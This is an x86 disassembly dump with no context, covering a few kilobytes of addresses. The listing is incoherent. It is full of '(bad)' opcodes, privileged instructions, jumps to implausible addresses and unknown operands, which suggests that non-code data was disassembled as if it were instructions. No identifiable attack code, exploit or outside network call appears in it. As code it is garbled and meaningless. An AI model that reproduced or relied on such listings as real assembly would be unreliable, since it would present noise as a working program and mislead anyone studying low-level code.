  431fd1:	fdiv   QWORD PTR [ebx]
  431fd3:	mov    bh,0x3
  431fd5:	push   es
  431fd6:	mov    esi,ecx
  431fd8:	sbb    cl,dl
  431fda:	dec    ebp
  431fdb:	sar    DWORD PTR [ebx],cl
  431fdd:	push   ebp
  431fde:	jne    0x431fef
  431fe0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  431fe6:	lea    ebx,[eax]
  431fe8:	call   0xf4ccabaf
  431fed:	sbb    dh,dl
  431fef:	add    edx,ebx
  431ff1:	push   ebp
  431ff2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  431ff8:	push   ecx
  431ff9:	mov    DWORD PTR [eax-0x30],edx
  431ffc:	test   DWORD PTR [edx],eax
  431ffe:	xadd   esp,esi
  432001:	pop    es
  432002:	add    cl,dl
  432004:	mov    eax,ecx
  432006:	or     al,0x45
  432008:	(bad)  
  432009:	push   eax
  43200a:	add    DWORD PTR [edx+0x0],eax
  43200d:	add    ecx,DWORD PTR [ecx]
  43200f:	and    dh,cl
  432011:	call   0xc728e1
  432016:	add    DWORD PTR [ebp+0x0],edx
  432019:	mov    esp,DWORD PTR [ebp+0x18]
  43201c:	add    BYTE PTR [eax+0x54],cl
  43201f:	xor    eax,DWORD PTR [eax]
  432021:	add    esp,DWORD PTR [esi+0x3b]
  432024:	inc    ebp
  432025:	je     0x431faa
  432027:	push   ecx
  432028:	cli    
  432029:	dec    ebp
  43202a:	mov    DWORD PTR [ebx],eax
  43202c:	(bad)  
  43202d:	or     al,0x5e
  43202f:	inc    eax
  432030:	add    BYTE PTR [ebx],al
  432032:	data16 and BYTE PTR [ebp+0x50],al
  432036:	sub    DWORD PTR [ecx],0xfffffff8
  432039:	add    BYTE PTR [ebp-0x75],ah
  43203c:	add    BYTE PTR [eax],bl
  43203e:	enter  0x894d,0x8b
  432042:	int3   
  432043:	loopne 0x43207f
  432045:	rol    BYTE PTR [eax],0x33
  432048:	lea    cx,[ebp+0xa]
  43204c:	data16 jb 0x432094
  43204f:	add    BYTE PTR [ebx+0x44890855],cl
  432055:	sbb    ah,al
  432057:	inc    ebp
  432058:	cmp    cl,BYTE PTR [edi]
  43205a:	add    BYTE PTR [edx+0x66],dl
  43205d:	xor    ecx,DWORD PTR [eax]
  43205f:	sub    eax,DWORD PTR [eax]
  432061:	mov    eax,DWORD PTR [eax]
  432063:	or     al,0x66
  432065:	ror    edx,cl
  432067:	dec    ebp
  432068:	inc    ebp
  432069:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43206f:	cld    
  432070:	or     BYTE PTR [edi+0x4501dd],dl
  432076:	ror    dh,0xee
  432079:	retf   
  43207a:	(bad)  
  43207b:	dec    ebp
  43207c:	mov    al,0x8b
  43207e:	loop   0x4320a0
  432080:	cmp    ecx,DWORD PTR [edx]
  432082:	inc    ebp
  432083:	daa    
  432084:	loop   0x43200d
  432086:	out    dx,al
  432087:	add    edi,eax
  432089:	add    BYTE PTR [eax+0x3f52ed55],bh
  43208f:	push   ebp
  432090:	inc    ebp
  432091:	xor    ebx,eax
  432093:	add    ebp,esi
  432095:	push   edx
  432096:	push   bp
  432098:	inc    ebp
  432099:	(bad)  
  43209a:	jmp    0xc342e6f3
  43209f:	sbb    al,0x33
  4320a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4320a8:	add    BYTE PTR [ebp+0x45],0x8b
  4320ac:	jmp    0xf98b:0x100041c8
  4320b3:	xor    esi,DWORD PTR [edx+0x3]
  4320b6:	mov    ecx,DWORD PTR [edi]
  4320b8:	fmul   DWORD PTR [edx]
  4320ba:	add    BYTE PTR [eax],al
  4320bc:	lea    eax,[ebx-0x4700273c]
  4320c2:	add    al,0x4f
  4320c4:	pop    DWORD PTR [eax]
  4320c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4320cc:	push   edx
  4320cd:	inc    WORD PTR [ebp+0x8]
  4320d1:	mov    eax,0x514f4d
  4320d6:	(bad)
  4320da:	add    al,al
  4320dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4320e2:	test   DWORD PTR [esi+0x74],esp
  4320e5:	inc    ebp
  4320e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4320ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4320f2:	or     dh,cl
  4320f4:	or     eax,0x8b8d5045
  4320f9:	inc    ebp
  4320fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432100:	jne    0x432135
  432102:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432108:	add    DWORD PTR [ebx],eax
  43210a:	add    bh,bh
  43210c:	adc    DWORD PTR [eax],ecx
  43210e:	adc    DWORD PTR [ebp+0x55],edi
  432111:	push   es
  432112:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432118:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43211f:	inc    ebp
  432120:	mov    esp,edi
  432122:	or     al,0xd8
  432124:	push   eax
  432125:	(bad)  
  432126:	jne    0x4320dc
  432128:	call   0x3b1a15
  43212d:	inc    ebp
  43212e:	sar    BYTE PTR [edx],0x84
  432131:	out    dx,al
  432132:	add    bh,al
  432134:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43213b:	(bad)  
  43213c:	and    al,al
  43213e:	fs jmp 0x7cc86743
  432144:	bswap  ecx
  432146:	scas   al,BYTE PTR es:[edi]
  432147:	inc    esp
  432148:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43214f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432156:	call   DWORD PTR [edi]
  432158:	shr    ah,0x84
  43215b:	xchg   DWORD PTR [eax],eax
  43215d:	add    DWORD PTR [eax],eax
  43215f:	add    bh,bh
  432161:	dec    ebp
  432162:	and    BYTE PTR [ecx-0x38],dl
  432165:	push   eax
  432166:	dec    DWORD PTR [ebx+0xfd885]
  43216c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432172:	mov    WORD PTR [ecx+0x0],ss
  432175:	lea    ecx,[ebx+0x108b20d8]
  43217b:	mov    WORD PTR [edx],ds
  43217d:	add    BYTE PTR [edi+0xff01ff],al
  432183:	mov    ecx,DWORD PTR [ebp-0x28]
  432186:	push   ecx
  432187:	shl    BYTE PTR [ebp+0x3a],0x8b
  43218b:	inc    ebp
  43218c:	in     al,0xeb
  43218e:	jno    0x43211b
  432190:	push   edx
  432191:	mov    DWORD PTR [eax-0x28],edx
  432194:	mov    eax,DWORD PTR [ebp+0x20]
  432197:	je     0x432120
  432199:	mov    eax,DWORD PTR [ecx]
  43219b:	sbb    BYTE PTR [eax],al
  43219d:	pop    DWORD PTR [eax]
  43219f:	add    esi,eax
  4321a1:	add    bl,al
  4321a3:	adc    DWORD PTR [edi],esi
  4321a5:	jmp    0x8bce71f7
  4321aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4321b1:	jne    0x43213e
  4321b3:	mov    ecx,DWORD PTR [eax]
  4321b5:	in     al,0x75
  4321b7:	pop    DWORD PTR [ecx+0x5301]
  4321bd:	push   edx
  4321be:	inc    DWORD PTR [ebx]
  4321c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4321c6:	add    BYTE PTR [edi+0x9],dl
  4321c9:	call   DWORD PTR [esi]
  4321cb:	and    dl,al
  4321cd:	and    bh,bh
  4321cf:	inc    edi
  4321d1:	test   eax,edx
  4321d3:	sldt   ebx
  4321d6:	xor    al,0x0
  4321d8:	pushf  
  4321d9:	(bad)  
  4321da:	jmp    0x4321e8
  4321dc:	mov    eax,edi
  4321de:	or     al,0x75
  4321e0:	inc    eax
  4321e1:	call   0x4318e9
  4321e6:	mov    eax,eax
  4321e8:	loopne 0x43216e
  4321ea:	inc    ebp
  4321eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4321f1:	mov    eax,DWORD PTR [ebp+0x20]
  4321f4:	add    edi,ecx
  4321f6:	add    BYTE PTR [eax],ch
  4321f8:	cmp    edi,0x18
  4321fb:	test   DWORD PTR [ebp+0xf],esi
  4321fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432205:	jne    0x432209
  432207:	call   0xffa21ccc
  43220c:	leave  
  43220d:	rcr    BYTE PTR [esp+eax*4],0x55
  432211:	add    ah,ch
  432213:	add    BYTE PTR [edi-0x48fef979],dh
  432219:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432220:	inc    esp
  432221:	mov    ebx,DWORD PTR [eax]
  432223:	fcom   st(2)
  432225:	add    BYTE PTR [edi],bl
  432227:	lea    ecx,[eax-0x18]
  43222a:	(bad)  
  43222b:	push   DWORD PTR [ecx]
  43222d:	call   0xffb56f8f
  432232:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432236:	fstp   DWORD PTR [esi+ebx*8]
  432239:	push   ebp
  43223a:	pop    ebp
  43223b:	mov    esi,DWORD PTR [edx-0x38]
  43223e:	add    DWORD PTR [eax],0x28
  432241:	mov    edi,DWORD PTR [ebx]
  432243:	xor    esi,DWORD PTR [edx+0x3]
  432246:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43224a:	pop    ebp
  43224b:	or     al,0x4
  43224d:	inc    ecx
  43224e:	push   ebp
  43224f:	(bad)  
  432250:	in     al,dx
  432251:	or     ah,ch
  432253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432254:	xbegin 0xffc8984a
  43225a:	clc    
  43225b:	adc    al,0x45
  43225d:	div    BYTE PTR [eax+ecx*1]
  432260:	pushf  
  432261:	add    bh,al
  432263:	jne    0x43223d
  432265:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43226f:	add    eax,DWORD PTR [ebp+0x52]
  432272:	adc    eax,0x20
  432275:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43227b:	test   DWORD PTR [eax],eax
  43227d:	clc    
  43227e:	data16 or al,BYTE PTR [ebp+0x45]
  432282:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432289:	rol    BYTE PTR [ebp+0x45],1
  43228c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432292:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432298:	push   ebx
  432299:	add    BYTE PTR [ebx+0x0],dl
  43229c:	push   ecx
  43229d:	jge    0x4322d2
  43229f:	add    BYTE PTR [esi+0x4],dl
  4322a2:	jne    0x432309
  4322a4:	mov    edx,0x457200
  4322a9:	jmp    0x43226d
  4322ab:	xor    edi,DWORD PTR [ebx]
  4322ad:	pop    edi
  4322ae:	cvtdq2ps xmm7,xmm0
  4322b1:	ret    0x0
  4322b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4322ba:	xor    ecx,DWORD PTR [edi]
  4322bc:	add    eax,DWORD PTR [ecx+0x3b]
  4322bf:	push   ebx
  4322c0:	rdpmc  
  4322c2:	out    0x8d,al
  4322c4:	add    BYTE PTR [eax],cl
  4322c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4322cc:	ret    0x450c
  4322cf:	sbb    al,0x8b
  4322d1:	cmp    eax,esi
  4322d3:	or     cl,al
  4322d5:	or     al,0xc2
  4322d7:	pop    eax
  4322d8:	inc    ebp
  4322d9:	add    ecx,DWORD PTR [edi]
  4322db:	add    esi,DWORD PTR [ebp+0x39]
  4322de:	invd   
  4322e0:	jge    0x4322ec
  4322e2:	mov    eax,0x478ac0
  4322e7:	cli    
  4322e8:	xor    esp,ecx
  4322ea:	mov    ebx,0x5b8ac0
  4322ef:	ret    0x33
  4322f2:	mov    eax,0x833b8b
  4322f7:	sub    BYTE PTR [ebx],al
  4322f9:	inc    ebp
  4322fa:	xor    ax,0x9cf8
  4322fe:	inc    bh
  432300:	mov    esp,esp
  432302:	hlt    
  432303:	test   DWORD PTR [ebp-0x8],esi
  432306:	mov    eax,DWORD PTR [ebp-0x14]
  432309:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43230f:	dec    edi
  432310:	or     BYTE PTR [eax],al
  432312:	jne    0x43229d
  432314:	mov    esi,esp
  432316:	call   0x77a9aedb
  43231b:	inc    ebp
  43231c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432322:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432328:	add    BYTE PTR [esi+0x7d],ah
  43232b:	inc    ebp
  43232c:	mov    bx,WORD PTR [ebp+0x8]
  432330:	add    DWORD PTR [ebp+0x53],0x30c008b
  432337:	inc    ebp
  432338:	mov    bx,di
  43233b:	lock test BYTE PTR [ecx+0x7000801],bh
  432342:	jge    0x432305
  432344:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43234a:	cli    
  43234b:	xor    bl,bh
  43234d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432353:	test   BYTE PTR [eax],cl
  432355:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43235c:	cmp    ebp,eax
  43235e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432365:	test   BYTE PTR [ebp+0x1],bh
  432368:	mov    ebx,0x458a00
  43236d:	xor    esi,DWORD PTR [ebx]
  43236f:	add    esp,DWORD PTR [esi-0x77]
  432372:	pop    ebp
  432373:	loopne 0x4323db
  432375:	inc    ebp
  432376:	clc    
  432377:	xor    edi,DWORD PTR [ebx]
  432379:	add    esi,DWORD PTR [edx-0x77]
  43237c:	data16 fdivr QWORD PTR [ebp-0x49]
  432380:	mov    ebx,0xb78afc
  432385:	hlt    
  432386:	xor    edi,DWORD PTR [edx]
  432388:	data16 add BYTE PTR [ebp+0x66],bl
  43238c:	data16 lock clc 
  43238f:	cmp    bh,BYTE PTR [ebx]
  432391:	add    BYTE PTR [edi+0x66],dh
  432394:	psubq  mm7,QWORD PTR [ebp+0x0]
  432398:	ltr    WORD PTR [ebp+0x66]
  43239c:	add    esi,eax
  43239e:	add    di,WORD PTR [ebp+0x2b]
  4323a2:	data16 data16 jge 0x432423
  4323a6:	mov    ebx,0xe08a8b
  4323ab:	jge    0x4323e0
  4323ad:	data16 data16 xor al,0x5d
  4323b1:	data16 data16 jne 0x4323ad
  4323b5:	mov    edi,DWORD PTR [ebx]
  4323b7:	fdiv   QWORD PTR [edx+0x7d]
  4323ba:	data16 data16 jge 0x4323f2
  4323be:	mov    ebx,0x758a66
  4323c3:	mov    esi,0x667233
  4323c8:	pop    ebp
  4323c9:	or     BYTE PTR [esi+0x0],ah
  4323cc:	clc    
  4323cd:	mov    edi,DWORD PTR [ebx]
  4323cf:	lock ja 0x43235d
  4323d2:	(bad)  
  4323d4:	jge    0x4323cd
  4323d6:	invd   
  4323d8:	pop    ebp
  4323d9:	add    BYTE PTR [ebx],al
  4323db:	(bad)  
  4323dc:	cmp    di,WORD PTR [ebp+0xf]
  4323e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4323e4:	mov    bx,WORD PTR [ebp-0x10]
  4323e8:	pop    bp
  4323ea:	fbstp  TBYTE PTR [ebx]
  4323ec:	test   DWORD PTR [ebx],eax
  4323ee:	add    BYTE PTR [ebx],bh
  4323f0:	add    BYTE PTR [esi+0x7d],ah
  4323f3:	jge    0x432380
  4323f5:	data16 in al,dx
  4323f7:	pop    ebp
  4323f8:	stc    
  4323f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432400:	mov    edi,ebx
  432402:	in     al,dx
  432403:	test   BYTE PTR [ebp+0x0],bh
  432406:	mov    eax,DWORD PTR [eax]
  432408:	call   0xbd401d98
  43240d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432413:	sti    
  432414:	call   0x8b4ba1a4
  432419:	add    ebp,esp
  43241b:	mov    bx,di
  43241e:	jnp    0x432446
  432420:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432426:	mov    eax,DWORD PTR [eax]
  432428:	call   0x7c3eaf93
  43242d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432433:	data16 data16 fistp WORD PTR [ebp+0xe]
  432438:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432442:	fisttp WORD PTR [ecx-0x7401f77b]
  432448:	(bad)  
  432449:	cld    
  43244a:	jne    0x432486
  43244c:	xor    eax,DWORD PTR [eax]
  43244e:	mov    esp,DWORD PTR [esi-0x10]
  432451:	sti    
  432452:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432459:	data16 adc bl,bh
  43245c:	push   ebp
  43245d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432464:	mov    WORD PTR [eax],es
  432466:	call   0xe48b:0x89fb3266
  43246d:	or     al,0x55
  43246f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432475:	push   cs
  432476:	push   esi
  432477:	mov    bh,0xc8
  432479:	or     al,0x2b
  43247b:	mov    bh,0xba
  43247d:	hlt    
  43247e:	mov    bh,bl
  432480:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432486:	dec    edi
  432487:	or     al,0x0
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	or     BYTE PTR [ebp+0x3b],dh
  43248e:	mov    ecx,DWORD PTR [edi]
  432490:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432496:	xor    al,0xd8
  432498:	pop    bp
  43249a:	lock xor esi,DWORD PTR [ebx]
  43249d:	lea    esp,[esi+0x1f]
  4324a0:	icebp  
  4324a1:	jb     0x4324a7
  4324a3:	add    al,al
  4324a5:	jge    0x4324b3
  4324a7:	mov    eax,eax
  4324a9:	fsubr  st,st(3)
  4324ab:	pop    ebp
  4324ac:	mov    esi,DWORD PTR [ebx]
  4324ae:	in     al,0x8d
  4324b0:	rcr    DWORD PTR [edi],0xc2
  4324b3:	jb     0x432513
  4324b5:	add    cl,cl
  4324b7:	jge    0x4324c5
  4324b9:	mov    edx,DWORD PTR [ebp-0x20]
  4324bc:	in     al,dx
  4324bd:	pop    ebp
  4324be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4324c3:	cmp    di,WORD PTR [ebp+0x0]
  4324c7:	mov    ebp,DWORD PTR [ebx]
  4324c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4324cf:	cmp    al,0x33
  4324d1:	mov    si,0x4f7d
  4324d5:	mov    eax,DWORD PTR [eax]
  4324d7:	lock inc ebp
  4324d9:	mov    esi,DWORD PTR [esi]
  4324db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4324e2:	clc    
  4324e3:	(bad)  
  4324e4:	cmp    edi,DWORD PTR [ebx]
  4324e6:	je     0x4324f7
  4324e8:	push   ebx
  4324e9:	loopne 0x4324fa
  4324eb:	dec    ecx
  4324ed:	mov    esp,DWORD PTR [esi-0x1c]
  4324f0:	int    0xf1
  4324f2:	mov    esi,0x703084d
  4324f7:	pcmpgtd mm6,mm1
  4324fa:	add    BYTE PTR [ebp+0x66],dh
  4324fd:	jmp    0x4324ca
  4324ff:	mov    eax,DWORD PTR [ebx]
  432501:	lock push ebp
  432503:	ror    DWORD PTR [ebp-0x2972feb3],1
  432509:	or     bh,dl
  43250b:	jb     0x43250b
  43250d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432513:	loopne 0x432515
  432515:	jne    0x432517
  432517:	data16 add BYTE PTR [esi+eiz*2],dh
  43251b:	mov    ecx,ebx
  43251d:	data16 cmp dh,cl
  432520:	add    BYTE PTR [edx],bh
  432522:	data16 add bl,cl
  432525:	data16 cmp dh,dl
  432528:	add    BYTE PTR [edx],bh
  43252a:	data16 add bl,cl
  43252d:	enterw 0x4df1,0x19
  432532:	pop    edi
  432533:	jne    0x4324b6
  432535:	mov    esi,DWORD PTR [esi]
  432537:	call   0x77b7b0d8
  43253c:	xor    ebp,DWORD PTR [ebx]
  43253e:	lea    esp,[esi+0x48]
  432541:	repnz in eax,0x3b
  432544:	add    BYTE PTR [ebp-0x37],dh
  432547:	xor    edx,DWORD PTR [ebp-0x15]
  43254a:	in     al,dx
  43254b:	xor    edx,DWORD PTR [esi+0x40]
  43254e:	mov    DWORD PTR [edi],0x338545fc
  432554:	clc    
  432555:	add    esi,DWORD PTR ds:0xe85b9c5f
  43255b:	ret    0xff
  43255e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432564:	cmp    DWORD PTR [esi+0x45],edx
  432567:	add    BYTE PTR [eax+eax*1+0x61],bh
  43256b:	data16 (bad) 
  43256d:	into   
  43256e:	data16 cmp cl,ch
  432571:	add    BYTE PTR [ecx+0x7ce0866],bh
  432577:	cmp    ah,BYTE PTR [esi+0x0]
  43257a:	add    bh,al
  43257c:	add    ah,bh
  43257e:	add    BYTE PTR [ebp+0x35c3f866],al
  432584:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43258b:	pop    ebp
  43258c:	adc    al,0x57
  43258e:	add    BYTE PTR [edi-0x723c409a],dh
  432594:	add    edi,edi
  432596:	jne    0x4325eb
  432598:	lea    edx,[ecx+0x1]
  43259b:	mov    ebx,0xd64ff1
  4325a0:	sar    DWORD PTR [ebx],1
  4325a2:	test   BYTE PTR [ebp+0x34],dh
  4325a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4325a9:	push   edi
  4325aa:	xor    BYTE PTR [ebx],0x39
  4325ad:	mov    esi,ebx
  4325af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4325b5:	xor    al,0x45
  4325b7:	fs pop ebx
  4325b9:	mov    ebx,0x9c3b36
  4325be:	je     0x4325eb
  4325c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4325c6:	mov    WORD PTR [ebx],?
  4325c8:	xor    al,0xbb
  4325ca:	fs dec edi
  4325cc:	mov    eax,DWORD PTR [eax]
  4325ce:	pop    edi
  4325cf:	cmp    ecx,ecx
  4325d1:	jne    0x432628
  4325d3:	mov    ebp,esp
  4325d5:	cld    
  4325d6:	push   esi
  4325d7:	pop    ebx
  4325d8:	inc    ebp
  4325d9:	stc    
  4325da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4325e2:	clc    
  4325e3:	test   dl,dl
  4325e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4325ea:	or     bl,al
  4325ec:	add    BYTE PTR [ebx+0x57665100],cl
  4325f2:	retf   0x3a45
  4325f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4325fd:	clc    
  4325fe:	add    BYTE PTR [ebx+0x66],bl
  432601:	dec    edx
  432603:	mov    edx,DWORD PTR [edi-0x76]
  432606:	push   edi
  432607:	add    al,0xb7
  432609:	xor    al,0xba
  43260b:	cmp    al,0x8d
  43260d:	je     0x43260e
  43260f:	mov    edx,DWORD PTR [ebx-0x46]
  432612:	push   ecx
  432613:	lea    edi,[ebx+0x534fff]
  432619:	push   ecx
  43261a:	cmp    edx,DWORD PTR [ebx+0x75]
  43261d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432623:	add    BYTE PTR [ebx],dh
  432625:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43262b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432632:	mov    ebx,0x3b3b00
  432637:	jne    0x432664
  432639:	mov    DWORD PTR [ebx+0x728afc],edi
  43263f:	xor    esi,DWORD PTR [ebx]
  432641:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432647:	push   edi
  432648:	cmp    esp,ebp
  43264a:	jne    0x43264c
  43264c:	sbb    DWORD PTR [eax],0x8085c3fc
  432652:	clc    
  432653:	inc    ebp
  432654:	pop    ebx
  432655:	sti    
  432656:	add    eax,0xeb8bc075
  43265b:	cld    
  43265c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432662:	mov    ecx,DWORD PTR [ecx+edx*2]
  432665:	rol    DWORD PTR [ebp-0x37],0xf
  432669:	mov    DWORD PTR [eax],ecx
  43266b:	inc    edi
  43266c:	(bad)  
  43266d:	in     eax,0x0
  43266f:	add    bh,bh
  432671:	(bad)  
  432672:	mov    esi,0xc38a5e
  432677:	mov    esi,DWORD PTR [ebx]
  432679:	push   ecx
  43267a:	mov    edi,0xfc4fc7
  43267f:	test   DWORD PTR [ebp-0x8],edx
  432682:	xor    ax,0x9cc7
  432686:	sub    ebp,eax
  432688:	inc    ebp
  432689:	(bad)  
  43268a:	sub    edi,edi
  43268c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432692:	inc    ebp
  432693:	add    BYTE PTR [esi+0x2b],ah
  432696:	or     bh,BYTE PTR [edx+0xf8ac2]
  43269c:	cmp    al,0x33
  43269e:	mov    edi,DWORD PTR [edx+0x4f81]
  4326a4:	(bad)  
  4326a5:	cmp    esi,DWORD PTR [ebx]
  4326a7:	je     0x432661
  4326a9:	push   ebx
  4326aa:	dec    edi
  4326ab:	str    ecx
  4326ae:	cmp    esp,DWORD PTR [esi+0x75]
  4326b1:	int    0x33
  4326b3:	mov    edi,0x789085f
  4326b8:	mov    edx,DWORD PTR [esp+edi*8]
  4326bb:	add    cl,cl
  4326bd:	data16 add al,0xcb
  4326c0:	push   ebp
  4326c1:	add    ebp,esp
  4326c3:	jne    0x4326b1
  4326c5:	(bad)  
  4326c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4326cc:	clc    
  4326cd:	xlat   BYTE PTR ds:[ebx]
  4326ce:	inc    ebp
  4326cf:	mov    esi,DWORD PTR [eax+edx*2]
  4326d2:	pushf  
  4326d3:	in     eax,0x8b
  4326d5:	add    ah,ch
  4326d7:	add    BYTE PTR [ebx+0x0],dl
  4326da:	push   ecx
  4326db:	add    ax,0x72cb
  4326df:	cmp    al,BYTE PTR [eax]
  4326e1:	add    BYTE PTR [ebp+0x66],al
  4326e4:	(bad)  
  4326e5:	retf   
  4326e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4326ed:	retf   
  4326ee:	cmp    eax,ecx
  4326f0:	pushf  
  4326f1:	jge    0x4326ba
  4326f3:	ss cld 
  4326f5:	pushf  
  4326f6:	test   DWORD PTR [edi-0x8],ebx
  4326f9:	je     0x432740
  4326fb:	xor    esi,DWORD PTR ds:0x7020840
  432701:	ror    BYTE PTR [ebp-0x37],0x8d
  432705:	push   ebp
  432706:	add    esp,ebp
  432708:	jb     0x432695
  43270a:	add    BYTE PTR [eax],cl
  43270c:	dec    ebp
  43270d:	mov    bh,0x81
  43270f:	push   esi
  432710:	push   ebx
  432711:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432718:	xor    al,BYTE PTR [eax]
  43271a:	mov    edx,DWORD PTR [edi+0x10]
  43271d:	(bad)  
  43271e:	scas   eax,DWORD PTR es:[edi]
  43271f:	cmp    bh,BYTE PTR [ebx]
  432721:	add    BYTE PTR [edi],cl
  432723:	mov    ebp,ebp
  432725:	cld    
  432726:	add    BYTE PTR [ebx],bh
  432728:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43272c:	dec    ebp
  43272d:	or     BYTE PTR [ebx],ch
  43272f:	ret    0x458b
  432732:	lock jmp 0x432726
  432735:	mov    ecx,DWORD PTR [eax]
  432737:	or     BYTE PTR [edi],al
  432739:	mov    ecx,eax
  43273b:	xor    DWORD PTR [edx+0x2],0x0
  43273f:	mov    bh,0xc1
  432741:	adc    BYTE PTR [eax],dh
  432743:	iret   
  432744:	inc    ebp
  432745:	mov    DWORD PTR [ebx],0x4dfff8c5
  43274b:	inc    BYTE PTR [ebx]
  43274d:	cmp    bh,al
  43274f:	add    BYTE PTR [ecx],dl
  432751:	data16 adc al,bh
  432754:	dec    ecx
  432755:	fisttp WORD PTR [ecx+0x456604c0]
  43275b:	add    dh,BYTE PTR ds:0x75e0845
  432761:	ret    0x4d
  432764:	lea    ecx,[ebx+0x18728301]
  43276a:	add    BYTE PTR [ebp+0x45],al
  43276d:	xor    eax,0xc7009ce9
  432772:	add    al,ch
  432774:	inc    ebp
  432775:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43277b:	xor    eax,0x781084d
  432780:	push   ebx
  432781:	call   0xf89a:0x89813251
  432788:	xor    al,BYTE PTR [ebp+0x3b]
  43278b:	cmp    eax,0xc78b9c76
  432790:	or     ah,dh
  432792:	inc    ebp
  432793:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432799:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43279f:	in     al,dx
  4327a0:	hlt    
  4327a1:	push   ebx
  4327a2:	push   ebx
  4327a3:	push   ecx
  4327a4:	push   ecx
  4327a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4327ab:	call   0xe889:0x8b32329a
  4327b2:	clc    
  4327b3:	icebp  
  4327b4:	pop    ebx
  4327b5:	or     BYTE PTR [ebp+0x7],al
  4327b8:	mov    eax,ecx
  4327ba:	clc    
  4327bb:	jb     0x43277e
  4327bd:	add    BYTE PTR [ebp+0x55],cl
  4327c0:	or     DWORD PTR [edi],0xc251d153
  4327c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4327d0:	mov    edi,eax
  4327d2:	or     cl,al
  4327d4:	inc    ebp
  4327d5:	dec    ebp
  4327d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4327dc:	or     WORD PTR [ecx],0x899a
  4327e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4327e7:	mov    edx,DWORD PTR [ecx+0x8]
  4327ea:	mov    eax,DWORD PTR [ebp-0x8]
  4327ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4327f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4327fa:	inc    ebp
  4327fb:	dec    eax
  4327fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432802:	add    edx,DWORD PTR [ecx-0x8]
  432805:	mov    ecx,DWORD PTR [ecx]
  432807:	clc    
  432808:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43280f:	mov    ecx,ebp
  432811:	clc    
  432812:	(bad)  
  432813:	popf   
  432814:	inc    DWORD PTR [eax]
